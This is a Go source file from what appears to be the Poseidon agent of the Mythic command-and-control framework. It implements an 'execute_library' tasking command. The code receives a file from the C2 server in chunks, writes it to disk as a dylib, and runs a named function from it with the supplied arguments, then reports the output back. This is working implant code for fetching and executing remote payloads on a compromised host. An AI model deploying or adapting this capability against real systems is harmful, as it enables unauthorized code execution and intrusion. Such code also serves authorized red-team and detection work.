package execute_library

import (
	// Standard
	"encoding/json"
	"fmt"
	"os"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	FileID       string
	FilePath     string
	FunctionName string
	Args         []string
}

func (e *Arguments) parseStringArray(configArray []interface{}) []string {
	urls := make([]string, len(configArray))
	if configArray != nil {
		for l, p := range configArray {
			urls[l] = p.(string)
		}
	}
	return urls
}
func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["file_id"]; ok {
		e.FileID = v.(string)
	}
	if v, ok := alias["file_path"]; ok {
		e.FilePath = v.(string)
	}
	if v, ok := alias["function_name"]; ok {
		e.FunctionName = v.(string)
	}
	if v, ok := alias["args"]; ok {
		e.Args = e.parseStringArray(v.([]interface{}))
	}
	return nil
}

// Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID != "" {
		if args.FilePath == "" {
			msg.SetError(fmt.Sprintf("When supplying a file, must specify a path to write the dylib to"))
			task.Job.SendResponses <- msg
			return
		}
		r := structs.GetFileFromMythicStruct{}
		r.FileID = args.FileID
		r.FullPath = ""
		r.Task = &task
		r.ReceivedChunkChannel = make(chan []byte)
		task.Job.GetFileFromMythic <- r

		fileBytes := make([]byte, 0)

		for {
			newBytes := <-r.ReceivedChunkChannel
			if len(newBytes) == 0 {
				break
			} else {
				fileBytes = append(fileBytes, newBytes...)
			}
		}
		if len(fileBytes) == 0 {
			msg.SetError(fmt.Sprintf("Failed to get file"))
			task.Job.SendResponses <- msg
			return
		}
		file, err := os.Create(args.FilePath)
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		_, err = file.Write(fileBytes)
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
	}
	resp, _ := executeLibrary(args.FilePath, args.FunctionName, args.Args)
	msg.Completed = true
	msg.UserOutput = resp.Message
	task.Job.SendResponses <- msg
	return
}
